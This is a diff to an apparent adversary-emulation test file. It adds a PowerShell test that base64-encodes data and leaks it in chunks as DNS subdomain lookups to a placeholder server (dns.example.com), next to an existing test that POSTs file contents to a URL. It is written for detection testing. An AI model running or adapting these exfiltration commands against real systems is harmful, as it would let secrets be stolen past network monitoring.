@@ -25,3 +25,39 @@ atomic_tests:
       $filecontent = Get-Content -Path #{filepath}
       Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
     name: powershell
+
+- name: Text Based Data Exfiltration using DNS subdomains
+  auto_generated_guid: c9207f3e-213d-4cc7-ad2a-7697a7237df9
+  description: |
+    Simulates an adversary using DNS tunneling to exfiltrate data over a Command and Control (C2) channel.
+  supported_platforms:
+  - windows
+  input_arguments:
+    dns_server:
+      description: DNS server IP address or domain name.
+      type: url
+      default: dns.example.com
+    exfiltrated_data:
+      description: Data to be exfiltrated.
+      type: string
+      default: SecretDataToExfiltrate
+    chunk_size:
+      description: Size of each DNS query chunk (in characters).
+      type: integer
+      default: 63
+  executor:
+    command: |
+      $dnsServer = "#{dns_server}"
+      $exfiltratedData = "#{exfiltrated_data}"
+      $chunkSize = #{chunk_size}
+
+      $encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
+      $encodedData = [Convert]::ToBase64String($encodedData)
+      $chunks = $encodedData -split "(.{$chunkSize})"
+
+      foreach ($chunk in $chunks) {
+          $dnsQuery = $chunk + "." + $dnsServer
+          Resolve-DnsName -Name $dnsQuery
+          Start-Sleep -Seconds 5
+      }
+    name: powershell
